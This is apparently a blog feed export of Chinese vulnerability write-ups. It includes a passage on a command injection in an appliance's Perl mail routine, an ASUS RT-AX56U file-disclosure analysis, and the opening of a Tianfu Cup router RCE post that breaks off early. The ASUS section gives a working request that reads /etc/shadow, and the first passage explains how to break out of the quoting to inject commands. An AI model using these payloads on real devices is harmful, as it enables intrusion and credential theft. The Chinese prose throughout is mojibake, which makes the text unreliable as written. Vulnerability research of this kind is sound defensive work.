<p>å¦‚æœéªŒè¯é€šè¿‡ï¼Œå°±è°ƒç”¨ LOG æ‰“å°è¿™äº›å˜é‡çš„å†…å®¹ï¼Œç„¶ååˆ©ç”¨ -e åˆ¤æ–­ $file å³ $QUARANTINE_PATH.â€&#x2F;â€œ.$requestData{hdnFilePath} æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå…¶ä¸­ $QUARANTINE_PATH æ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œå®šä¹‰ä¸º &#x2F;var&#x2F;quarantineã€‚</p>
<p>å¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œå°±è°ƒç”¨ mail_sender å‡½æ•°</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">OPCODE mail_sender&#123;</span><br><span class="line">    <span class="regexp">//</span> ...</span><br><span class="line">    LOG applog <span class="string">&quot;MAIL_SEND: Values--&gt;\n Mail Server: --&gt; $smtpserverhost\n Mail From: --&gt; $fromaddress\n Mail To: --&gt; $toEmail\n Subject: --&gt; $subject\n Username: --&gt; $mailusername\n MailAction:--&gt; $mailaction\n SMTPSecurityMode:--&gt; $smtpsecuritymode\n SMTPCertificate:--&gt;$smtpcertificate\n Appliance IP(LAN):--&gt; $ip\n&quot;</span></span><br><span class="line">	IF(<span class="string">&quot;$mailaction eq $MAIL_WITH_VAR&quot;</span>)&#123;</span><br><span class="line">		out = EXEC /bin/cschelper <span class="string">&#x27;mail_send&#x27;</span> $fromaddress $fromaddresswithname $toEmail $toEmail $subject <span class="string">&quot;&quot;</span> $smtpserverhost $smtpserverport $mailusername $mailpassword $mailaction $smtpsecuritymode $smtpcertificate $certpassword <span class="string">&quot;1&quot;</span> <span class="string">&quot;$mailbody&quot;</span> <span class="string">&quot;text/html&quot;</span></span><br><span class="line">	&#125;ELSE IF(<span class="string">&quot;$mailaction eq $MAIL_FORWARD&quot;</span>)&#123;</span><br><span class="line">		out = EXECSH <span class="string">&quot;/bin/cschelper mail_send &#x27;$fromaddress&#x27; &#x27;$fromaddresswithname&#x27; &#x27;$toEmail&#x27; &#x27;$toEmail&#x27; &#x27;$subject&#x27; &#x27;$mailbody&#x27; &#x27;$smtpserverhost&#x27; &#x27;$smtpserverport&#x27; &#x27;$mailusername&#x27; &#x27;$mailpassword&#x27; &#x27;$mailaction&#x27; &#x27;$smtpsecuritymode&#x27; &#x27;$smtpcertificate&#x27; &#x27;$certpassword&#x27; &#x27;1&#x27; &#x27;$attachmentfile&#x27;&quot;</span></span><br><span class="line">	&#125;ELSE IF(<span class="string">&quot;$mailaction eq $MAIL_ATTACHMENT&quot;</span>)&#123;</span><br><span class="line">		out = EXECSH <span class="string">&quot;/bin/cschelper mail_send &#x27;$fromaddress&#x27; &#x27;$fromaddresswithname&#x27; &#x27;$toEmail&#x27; &#x27;$toEmail&#x27; &#x27;$subject&#x27; &#x27;$mailbody&#x27; &#x27;$smtpserverhost&#x27; &#x27;$smtpserverport&#x27; &#x27;$mailusername&#x27; &#x27;$mailpassword&#x27; &#x27;$mailaction&#x27; &#x27;$smtpsecuritymode&#x27; &#x27;$smtpcertificate&#x27; &#x27;$certpassword&#x27; &#x27;1&#x27; &#x27;$attachmentfile&#x27;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	// ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°å¤´éƒ¨è¿›è¡Œå¾ˆå¤šåˆå§‹åŒ–æ“ä½œï¼Œéšåæ ¹æ® $mailaction å€¼çš„ä¸åŒæ‰§è¡Œä¸åŒé€»è¾‘ï¼Œåœ¨ send_mail å‡½æ•°ä¸­å¯ä»¥çœ‹åˆ° ä¼ å…¥çš„ $mailaction å€¼åº”è¯¥æ˜¯ $MAIL_FORWARDï¼Œé‚£ä¹ˆè¿™é‡Œä¼šæ‰§è¡Œ</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">out = EXECSH <span class="string">&quot;/bin/cschelper mail_send &#x27;$fromaddress&#x27; &#x27;$fromaddresswithname&#x27; &#x27;$toEmail&#x27; &#x27;$toEmail&#x27; &#x27;$subject&#x27; &#x27;$mailbody&#x27; &#x27;$smtpserverhost&#x27; &#x27;$smtpserverport&#x27; &#x27;$mailusername&#x27; &#x27;$mailpassword&#x27; &#x27;$mailaction&#x27; &#x27;$smtpsecuritymode&#x27; &#x27;$smtpcertificate&#x27; &#x27;$certpassword&#x27; &#x27;1&#x27; &#x27;$attachmentfile&#x27;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>EXECSH å¯¹åº”çš„æ“ä½œæ˜¯ &#x2F;bin&#x2F;sh -cï¼ŒåŒæ—¶è¿™æ¡å‘½ä»¤ä¸­æ‹¼æ¥äº†æˆ‘ä»¬å¯æ§çš„ $smtpserverhostï¼Œå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</p>
<h2 id="C-æ¼æ´è§¦å‘"><a href="#C-æ¼æ´è§¦å‘" class="headerlink" title="C. æ¼æ´è§¦å‘"></a>C. æ¼æ´è§¦å‘</h2><p>åœ¨è§¦å‘æ¼æ´çš„è·¯å¾„ä¸Šè¿˜å­˜åœ¨å‡ ä¸ªé—®é¢˜</p>
<h3 id="C-1-ç»•è¿‡æ–‡ä»¶åˆ¤æ–­"><a href="#C-1-ç»•è¿‡æ–‡ä»¶åˆ¤æ–­" class="headerlink" title="C.1 ç»•è¿‡æ–‡ä»¶åˆ¤æ–­"></a>C.1 ç»•è¿‡æ–‡ä»¶åˆ¤æ–­</h3><p>åœ¨è°ƒç”¨ mail_sender å‡½æ•°ä¹‹å‰å­˜åœ¨ä¸€ä¸ªå¯¹ $file æ˜¯å¦å­˜åœ¨çš„åˆ¤æ–­ï¼Œå…¶ä¸­ $file å‚æ•°æ˜¯ $QUARANTINE_PATH å’Œç”¨æˆ·æäº¤çš„ hdnFilePath ä¸¤ä¸ªå˜é‡æ‹¼æ¥è€Œæ¥ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰$file å­˜åœ¨æ—¶ï¼Œæ‰èƒ½è§¦å‘ mail_sender åŠŸèƒ½ï¼Œ$QUARANTINE_PATH å˜é‡çš„å€¼ä¸º &#x2F;var&#x2F;quarantineï¼Œè€Œé€šå¸¸æƒ…å†µä¸‹æ”»å‡»è€…æ— æ³•å¾—çŸ¥æ­¤ç›®å½•ä¸‹æœ‰å“ªäº›æ–‡ä»¶ã€‚</p>
<p>ä¸ºäº†ç»•è¿‡è¿™ä¸ªåˆ¤æ–­ï¼Œæˆ‘ä»¬å¯ä»¥æäº¤ hdnFilePath&#x3D;&#x2F;ï¼Œæ‹¼æ¥åå¾—åˆ° $file &#x3D; &#x2F;var&#x2F;quarantine&#x2F;ï¼Œè€Œè¿™é‡Œå°±å˜æˆäº†åˆ¤æ–­ &#x2F;var&#x2F;quarantine&#x2F; ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œæ˜¾ç„¶å¯ä»¥é€šè¿‡ã€‚</p>
<h3 id="C-2-å‘½ä»¤æ³¨å…¥"><a href="#C-2-å‘½ä»¤æ³¨å…¥" class="headerlink" title="C.2 å‘½ä»¤æ³¨å…¥"></a>C.2 å‘½ä»¤æ³¨å…¥</h3><p>åœ¨æ³¨å…¥å‘½ä»¤çš„æ—¶å€™ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">ELSE IF(<span class="string">&quot;$mailaction eq $MAIL_FORWARD&quot;</span>)&#123;</span><br><span class="line">		out = EXECSH <span class="string">&quot;/bin/cschelper mail_send &#x27;$fromaddress&#x27; &#x27;$fromaddresswithname&#x27; &#x27;$toEmail&#x27; &#x27;$toEmail&#x27; &#x27;$subject&#x27; &#x27;$mailbody&#x27; &#x27;$smtpserverhost&#x27; &#x27;$smtpserverport&#x27; &#x27;$mailusername&#x27; &#x27;$mailpassword&#x27; &#x27;$mailaction&#x27; &#x27;$smtpsecuritymode&#x27; &#x27;$smtpcertificate&#x27; &#x27;$certpassword&#x27; &#x27;1&#x27; &#x27;$attachmentfile&#x27;&quot;</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ $smtpserverport å˜é‡æ˜¯ç”¨æˆ·å¯æ§çš„ hdnDestDomainï¼Œä½†å•çº¯ä½¿ç”¨åå¼•å·æˆ–è€…åˆ†å·ä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦å…ˆä½¿ç”¨å•å¼•å·å°†å¾…æ³¨å…¥çš„å‘½ä»¤é—­åˆæ‰å¯ä»¥ã€‚</p>
<h3 id="C-3-æ—¥å¿—è°ƒè¯•"><a href="#C-3-æ—¥å¿—è°ƒè¯•" class="headerlink" title="C.3 æ—¥å¿—è°ƒè¯•"></a>C.3 æ—¥å¿—è°ƒè¯•</h3><p>perl éƒ¨åˆ†æ²¡æœ‰å¾ˆå¥½çš„æ–¹æ³•å¯ä»¥è°ƒè¯•ï¼Œä½†åœ¨ä»£ç ä¸­å­˜åœ¨å¾ˆå¤š LOG æ‰“å°æ—¥å¿—ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨  &#x2F;var&#x2F;tslog&#x2F;applog.log æ–‡ä»¶ä¸­æ‰¾åˆ°è¿™äº›ä¿¡æ¯ï¼Œé€šè¿‡è°ƒè¯•ä¿¡æ¯è¾…åŠ©åˆ†æã€‚</p>
<h3 id="C-4-æ¼æ´è§¦å‘æ¼”ç¤º"><a href="#C-4-æ¼æ´è§¦å‘æ¼”ç¤º" class="headerlink" title="C.4 æ¼æ´è§¦å‘æ¼”ç¤º"></a>C.4 æ¼æ´è§¦å‘æ¼”ç¤º</h3><p><a href="https://asciinema.org/a/ObglFFm6uDh6Hi8Tzrv8BjDNo"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://asciinema.org/a/ObglFFm6uDh6Hi8Tzrv8BjDNo.svg"
                      alt="asciicast"
                ></a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>RT-AX56U information disclosure vulnerability</title>
    <url>/2021/12/01/asus-info-disclosure/</url>
    <content><![CDATA[<p>2021 å¹´ 10 æœˆ 7 æ—¥ï¼ŒASUS å‘å¸ƒäº†é’ˆå¯¹ RT-AX56U ç­‰è·¯ç”±å™¨çš„å›ºä»¶æ›´æ–°ï¼Œå…¶ä¸­ä¿®å¤äº†ä¸€ä¸ªæ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œæœ¬æ–‡å¯¹æ­¤æ¼æ´ç®€å•åˆ†æã€‚</p>
<span id="more"></span>

<p>å›ºä»¶ä¸‹è½½é“¾æ¥ï¼š<a class="link"   href="https://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RT-AX56U/HelpDesk_BIOS/" >RT-AX56Uï½œæ— çº¿è·¯ç”±å™¨ï½œASUS ä¸­å›½<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œå—å½±å“å›ºä»¶ä¸º <strong>3.0.0.4.386.44266</strong> åŠæ›´æ—©ç‰ˆæœ¬ã€‚</p>
<p>æˆ‘ä»¬ä»¥ 3.0.0.4.386.44266 ä¸ºä¾‹è¿›è¡Œåˆ†æï¼Œç¯å¢ƒå‡†å¤‡ç­‰æ“ä½œå¯å‚è€ƒ<a href="https://wzt.ac.cn/2021/11/02/TFC2021-AX56U/">å‰æ–‡</a>ã€‚</p>
<p>ç›®æ ‡äºŒè¿›åˆ¶ç¨‹åºï¼š&#x2F;usr&#x2F;sbin&#x2F;httpdï¼Œè¿™ä¸ªç¨‹åºè´Ÿè´£è§£æè®¾å¤‡æ”¶åˆ°çš„ web è¯·æ±‚ã€‚</p>
<p>Asus åœ¨å…¶è·¯ç”±å™¨ä¸­ä½¿ç”¨äº†ä¸€äº›å¼€æºç»„ä»¶ï¼Œä¸ºäº†éµå®ˆ GPL å¼€æºåè®®ï¼ŒAsus æ›¾åœ¨å…¶å®˜æ–¹ç½‘ç«™ä¸Šå…¬å¼€äº†ç›¸å…³æºä»£ç ï¼Œåç»­çš„æ¢…æ—å›ºä»¶å°±æ˜¯åŸºäºè¿™ä»½æºä»£ç è¿›è¡Œå¼€å‘ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒ<a class="link"   href="https://github.com/RMerl/asuswrt-merlin.ng" >æ¢…æ—<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>çš„æºä»£ç è¾…åŠ©åˆ†æã€‚</p>
<p>é€šè¿‡æºä»£ç åœ¨ IDA ä¸­å®šä½åˆ° sub_19644 å‡½æ•°ï¼Œæ­¤å‡½æ•°ç”¨äºè§£æç”¨æˆ·ä¼ å…¥çš„ HTTP è¯·æ±‚ï¼Œè¿™ä¸ªå‡½æ•°é€»è¾‘è¾ƒå¤šï¼Œä½†å…¶åŸºæœ¬è§£ææµç¨‹ä¸ºï¼šæ”¶åˆ°è¯·æ±‚ï¼Œè¿›è¡Œç®€å•çš„é€è¡Œè§£æï¼Œç„¶åè·å– URI å­—æ®µï¼Œè¿‡æ»¤æ‰å¯èƒ½çš„è·¯å¾„ç©¿è¶Šå­—ç¬¦ä¸²ï¼Œä¹‹ååˆ†åˆ«åŒ¹é…ä¸‰ä¸ª URI å¯¹ç…§è¡¨ï¼Œåˆ¤æ–­å½“å‰è¯·æ±‚çš„ URI æ˜¯å¦éœ€è¦èº«ä»½éªŒè¯ï¼Œä»¥åŠè·å–å¯¹åº”æ¥å£çš„ handler å‡½æ•°ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨ mime_handlers å…¨å±€ç»“æ„ä½“ä¸­æ‰¾åˆ°ç›¸å…³æ¥å£å®šä¹‰ï¼Œæ ¹æ®æºä»£ç ç›¸å…³ä¿¡æ¯ï¼Œåˆ©ç”¨ä»¥ä¸‹ IDAPython è„šæœ¬æå–æ‰€æœ‰æ— éœ€èº«ä»½éªŒè¯çš„æ¥å£</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_str</span>(<span class="params">address</span>):</span><br><span class="line">    _<span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        _temp = Byte(address)</span><br><span class="line">        address += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> _temp == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        _<span class="built_in">str</span> += <span class="built_in">chr</span>(_temp)</span><br><span class="line">    <span class="keyword">return</span> _<span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_auth</span>(<span class="params">address</span>):</span><br><span class="line">    _address = address + <span class="number">20</span></span><br><span class="line">    _tmp = Dword(_address)</span><br><span class="line">    <span class="keyword">if</span> _tmp == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_handler</span>(<span class="params">address</span>):</span><br><span class="line">    _address = address + <span class="number">16</span></span><br><span class="line">    _tmp = Dword(_address)</span><br><span class="line">    <span class="keyword">return</span> _tmp</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x0009BAC4</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    _<span class="built_in">str</span> = get_str(Dword(address))</span><br><span class="line">    _auth = check_auth(address)</span><br><span class="line">    _handler = get_handler(address)</span><br><span class="line">    <span class="keyword">if</span> _auth == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(_<span class="built_in">str</span>, <span class="built_in">hex</span>(_handler))</span><br><span class="line">    address += <span class="number">0x18</span></span><br><span class="line">    <span class="keyword">if</span> Dword(address) &lt; <span class="number">0x70000</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p>åˆ†ææ¥å£é€»è¾‘ï¼Œå½“è®¿é—® .htm ç­‰é™æ€èµ„æºæ—¶ï¼Œä¼šæ‰§è¡Œ sub_1C3B8 å‡½æ•°ï¼Œä»£ç ç‰‡æ®µ1ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v5 = cgi_get_0(<span class="string">&quot;current_lang&quot;</span>, v78, v4);</span><br><span class="line"><span class="keyword">if</span> ( !v5 )</span><br><span class="line">    v5 = v3;</span><br><span class="line">v70 = sub_1B420(v5, &amp;unk_A13A0) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>ç”±äºéœ€è¦æ”¯æŒå¤šè¯­è¨€ï¼Œè¿™æ®µä»£ç ä¼šå°è¯•è·å–ç”¨æˆ·æäº¤çš„ current_lang å‚æ•°ï¼Œç„¶åä¼ å…¥ sub_1B420 å‡½æ•°ï¼Œä»£ç ç‰‡æ®µ2ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1B420</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *current_lang, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *v3; <span class="comment">// r7</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">signed</span> <span class="type">int</span> v5; <span class="comment">// r5</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// r9</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *v7; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *v8; <span class="comment">// r6</span></span><br><span class="line">    <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *v10; <span class="comment">// r3</span></span><br><span class="line">    <span class="type">int</span> v11; <span class="comment">// r9</span></span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">int</span> v13; <span class="comment">// r2</span></span><br><span class="line">    <span class="type">int</span> v14; <span class="comment">// t1</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// r3</span></span><br><span class="line">    <span class="type">int</span> v16; <span class="comment">// r1</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 *v17; <span class="comment">// r2</span></span><br><span class="line">    <span class="type">char</span> v18[<span class="number">16</span>]; <span class="comment">// [sp+0h] [bp-38h] BYREF</span></span><br><span class="line">    <span class="type">char</span> ptr; <span class="comment">// [sp+10h] [bp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( current_lang &amp;&amp; *current_lang )</span><br><span class="line">        <span class="built_in">snprintf</span>(v18, <span class="number">0x10</span>u, <span class="string">&quot;%s.dict&quot;</span>, current_lang);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">strcpy</span>(v18, <span class="string">&quot;EN.dict&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v18, byte_A0ABC) )</span><br><span class="line">    &#123;</span><br><span class="line">        sub_1B3D8(a2);</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = fopen(v18, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v3 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            result = <span class="built_in">strcmp</span>(v18, <span class="string">&quot;EN.dict&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !result )</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            <span class="built_in">strcpy</span>(v18, <span class="string">&quot;EN.dict&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">snprintf</span>(byte_A0ABC, <span class="number">0xC</span>u, <span class="string">&quot;%s&quot;</span>, v18);</span><br><span class="line">        <span class="built_in">memset</span>(a2, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">        fseek(v3, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        v4 = ftell(v3);</span><br><span class="line">        v5 = v4 + <span class="number">125</span>;</span><br><span class="line">        v6 = v4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;dict_size %d\n&quot;</span>, v4 + <span class="number">125</span>);</span><br><span class="line">        v7 = <span class="built_in">malloc</span>(v5);</span><br><span class="line">        a2[<span class="number">3</span>] = v7;</span><br><span class="line">        v8 = v7;</span><br><span class="line">        fseek(v3, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        fread(&amp;ptr, <span class="number">1u</span>, <span class="number">3u</span>, v3);</span><br><span class="line">        <span class="built_in">memset</span>(a2[<span class="number">3</span>], <span class="number">0</span>, v5);</span><br><span class="line">        fread(a2[<span class="number">3</span>], <span class="number">1u</span>, v5, v3);</span><br><span class="line">        v9 = v6 + <span class="number">124</span>;</span><br><span class="line">        v10 = a2[<span class="number">3</span>];</span><br><span class="line">        v11 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( v9 + <span class="number">1</span> &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v14 = *v10++;</span><br><span class="line">            v13 = v14;</span><br><span class="line">            <span class="keyword">if</span> ( v14 == <span class="number">10</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                ++v11;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( !v13 )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            --v9;</span><br><span class="line">        &#125;</span><br><span class="line">        a2[<span class="number">2</span>] = <span class="built_in">malloc</span>(<span class="number">4</span> * v11);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;dict_item %d\n&quot;</span>, v11);</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i != v11; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">            *(a2[<span class="number">2</span>] + <span class="number">4</span> * i) = v8;</span><br><span class="line">            v17 = v8;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = v17;</span><br><span class="line">                <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                v16 = *v17++;</span><br><span class="line">                <span class="keyword">if</span> ( v16 == <span class="number">10</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    --v5;</span><br><span class="line">                    *v8++ = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( !v16 )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                --v5;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        *a2 = i;</span><br><span class="line">        fclose(v3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆå°† current_lang æ‹¼æ¥åˆ°å˜é‡ v18 ä¸­ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ snprintfï¼Œé•¿åº¦ 0x10ï¼Œé»˜è®¤ä¼šä»¥ .dict ç»“å°¾ï¼Œç„¶åæ ¹æ®æ–‡ä»¶è·¯å¾„æ‰“å¼€å¯¹åº”æ–‡ä»¶ï¼Œè¯»å–å…¶ä¸­çš„å†…å®¹ä½œä¸ºåŸºæœ¬è¯­æ–™ã€‚</p>
<p>å¦‚æœç”¨æˆ·æäº¤ä¸€ä¸ªé•¿åº¦åˆšå¥½ç­‰äº 15 å­—èŠ‚çš„æ•°æ®ï¼Œé‚£ä¹ˆ .dict å°±ä¼šè¢«å†²æ´—æ‰ï¼Œåé¢å¯ä»¥æ‰“å¼€ä»»æ„æ–‡ä»¶ä½œä¸ºåŸºæœ¬è¯­æ–™ï¼Œå½“é™æ€å†…å®¹è¾“å‡ºæ—¶ï¼Œä¼šå°†è¿™é‡Œæ‰“å¼€çš„æ–‡ä»¶å†…å®¹è¾“å‡ºã€‚(ä½†æ˜¯åªèƒ½è¾“å‡ºç¬¬ä¸€è¡Œ)</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ç±»ä¼¼å¦‚ä¸‹çš„è¯·æ±‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /error_page.htm?current_lang=/////etc/shadow HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Referer: https://127.0.0.1/Main_Login.asp</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>å½“æ­¤è¯·æ±‚å‘é€åˆ°å­˜åœ¨æ¼æ´çš„è®¾å¤‡ä¹‹åï¼Œå°±å¯ä»¥æ³„éœ²å‡ºç®¡ç†å‘˜ç”¨æˆ·çš„å¯†ç ä¿¡æ¯</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/asus-info-dis-1.png"
                     
                ></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>Tianfu Cup 2021 RT-AX56U RCE</title>
    <url>/2021/11/02/TFC2021-AX56U/</url>
    <content><![CDATA[<p>2021 å¹´å¤©åºœæ¯ç›®æ ‡ä¹‹ä¸€æ˜¯ ASUS RT-AX56U V2ï¼Œæ¯”èµ›è¦æ±‚é€‰æ‰‹ä» LAN ä¾§æœªæˆæƒè·å–è®¾å¤‡ root shellï¼Œåœ¨æ¯”èµ›å¼€å§‹å‰ ASUS å®˜æ–¹å‘å¸ƒäº†æ•°ä¸ªè¡¥ä¸æ¥ä¿®å¤æ¼æ´ï¼Œä½†ä¾ç„¶æœ‰ä¸¤é˜Ÿé€‰æ‰‹æˆåŠŸç ´è§£äº†æ­¤è®¾å¤‡ï¼Œæœ¬æ–‡å°†å¯¹å…¶ä¸­æ¶‰åŠçš„ç›¸å…³æ¼æ´è¿›è¡Œåˆ†æã€‚</p>
<span id="more"></span>

<h2 id="firmware"><a href="#firmware" class="headerlink" title="firmware"></a>firmware</h2><p>å›ºä»¶å¯ä» ASUS <a class="link"   href="https://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RT-AX56U/HelpDesk_BIOS/" >å®˜æ–¹ç½‘ç«™<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ä¸‹è½½ï¼Œæˆ‘ä»¬ä»¥ RT-AX56U V1 è®¾å¤‡çš„ <strong>3.0.0.4.386.42808</strong> ä¸ºä¾‹è¿›è¡Œåˆ†æã€‚</p>
<p>ä¸‹è½½å›ºä»¶å binwalk å¯ç›´æ¥è§£åŒ…ï¼Œå¾—åˆ°ä¸€ä¸ªæ ‡å‡†çš„ Linux æ–‡ä»¶ç³»ç»Ÿï¼Œä» &#x2F;usr&#x2F;sbin ç›®å½•ä¸‹æ‰¾åˆ°å…³é”®æ–‡ä»¶ cfg_server</p>
<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>ä¸ºäº†æ–¹ä¾¿åˆ†æï¼Œé¦–å…ˆè¦æ‰“å¼€è®¾å¤‡çš„ ssh æœåŠ¡ï¼Œå¯¼èˆªåˆ°è®¾å¤‡åå° -&gt; ç³»ç»Ÿç®¡ç† -&gt; ç³»ç»Ÿè®¾ç½® -&gt; å¯ç”¨ SSHï¼Œæ¥å¼€å¯ ssh æœåŠ¡ã€‚</p>
<p>é€šè¿‡ç®¡ç†å‘˜è´¦æˆ·è¿æ¥ sshï¼Œåœ¨ &#x2F;tmp&#x2F;test ç›®å½•ä¸‹å‡†å¤‡ä¸€ä¸ª gdbserver(é“¾æ¥ï¼š<a class="link"   href="https://pan.baidu.com/s/1Z_1EBswZWWIX-AU6joIh_Q" >https://pan.baidu.com/s/1Z_1EBswZWWIX-AU6joIh_Q<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>  æå–ç ï¼š4ypa)ï¼Œ å¯åˆ©ç”¨è®¾å¤‡çš„ wget å‘½ä»¤ä»å¤–éƒ¨æœåŠ¡å™¨ä¸‹è½½åˆ°æœ¬åœ°ã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>cfg_server äºŒè¿›åˆ¶ç¨‹åºåŒæ—¶ç›‘å¬ tcp ä¸ udp çš„ 7788 ç«¯å£ï¼Œå®ƒå®ç°äº† WiFI Mesh çš„ç›¸å…³åŠŸèƒ½ã€‚</p>
